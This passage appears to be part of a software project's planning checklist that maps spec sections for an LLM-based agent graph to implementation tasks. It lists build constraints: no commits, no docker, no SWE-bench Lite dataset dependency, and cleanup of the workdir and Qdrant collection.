- §4.4 state / §4.5 models: T2 (state) + T1 (LLM).
- §4.6 termination: T2 (routing) + spec-carried caps.
- §4.7 observability: `@observed` on every node/tool per T5/T6.

Constraints:
- ✅ Every task ends at tests passing; none commit.
- ✅ No `docker` anywhere.
- ✅ No `datasets` (SWE-bench Lite dependency) anywhere.
- ✅ `run` in `graph.py` always cleans up workdir + Qdrant collection.
